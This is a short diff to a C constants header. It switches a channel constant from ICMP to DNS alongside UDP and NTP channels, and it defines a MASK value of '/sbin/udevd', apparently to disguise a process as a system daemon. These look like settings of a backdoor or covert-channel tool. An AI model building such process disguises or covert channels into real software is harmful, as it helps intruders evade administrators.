@@ -33,7 +33,7 @@ NOTES: This file holds the constants used throughout the program.
 
 #define CHAN_UDP  0
 #define CHAN_NTP  1
-#define CHAN_ICMP 2
+#define CHAN_DNS 2
 
 #define MASK 	"/sbin/udevd"
 
